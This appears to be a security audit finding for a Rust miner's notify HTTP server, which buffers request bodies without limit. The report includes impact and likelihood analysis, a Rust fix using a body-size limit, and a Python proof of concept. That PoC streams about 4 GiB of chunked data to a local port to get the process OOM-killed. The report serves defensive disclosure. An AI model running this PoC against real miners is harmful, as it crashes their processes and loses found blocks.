### Title
Unbounded HTTP Body Allocation in Miner Notify Handler Allows Local OOM Crash — (`miner/src/client.rs`)

### Summary
The miner's notify HTTP server (`handle` function) collects the full incoming request body into memory with no size limit, allowing any process that can reach the bound socket to crash the miner via OOM.

### Finding Description
`handle` in `miner/src/client.rs` (lines 358–369) passes the raw `hyper::body::Incoming` directly to `BodyExt::collect(...).await?.aggregate()` without wrapping it in `http_body_util::Limited` or any equivalent guard. An attacker sends an HTTP POST with a multi-gigabyte streaming body; hyper reads and buffers every chunk until the process exhausts virtual memory or is OOM-killed. [3](#0-2) 

The server loop in `listen_block_template_notify` spawns a new Tokio task per accepted connection with no concurrency cap, so multiple simultaneous large-body connections compound the effect. [4](#0-3) 

### Impact Explanation
The miner process is killed by the OS OOM killer (or panics on allocation failure), halting all block submission. Any valid block found during the attack window is lost. Impact is scoped to the local miner process crash (Note 0–500).

### Likelihood Explanation
The `listen` feature is opt-in and disabled by default. However, it is a documented, supported production configuration — the code even prints an instructional log message directing operators to enable it. When enabled (even at `127.0.0.1`), every unprivileged process on the same host is a potential attacker. No credentials, keys, or elevated privileges are required. [5](#0-4) 

### Recommendation
Wrap the incoming body with `http_body_util::Limited` before collecting:

```rust
use http_body_util::Limited;

const MAX_BODY: u64 = 1 << 20; // 1 MiB — block templates are well under this

async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = Limited::new(req, MAX_BODY)
        .collect()
        .await
        .map_err(|_| "request body too large")?
        .aggregate();
    // ...
}
```

Additionally, limit concurrent connections in `listen_block_template_notify` with a semaphore.

### Proof of Concept
```python
import socket, time

HOST, PORT = "127.0.0.1", 8888
CHUNK = b"X" * (1 << 16)  # 64 KiB chunks

s = socket.create_connection((HOST, PORT))
header = (
    b"POST / HTTP/1.1\r\n"
    b"Host: 127.0.0.1\r\n"
    b"Content-Type: application/json\r\n"
    b"Transfer-Encoding: chunked\r\n\r\n"
)
s.sendall(header)
# Stream ~4 GiB of chunked data
for _ in range(65536):
    s.sendall(f"{len(CHUNK):x}\r\n".encode() + CHUNK + b"\r\n")
    time.sleep(0.001)
# Monitor miner RSS — process will be OOM-killed
```
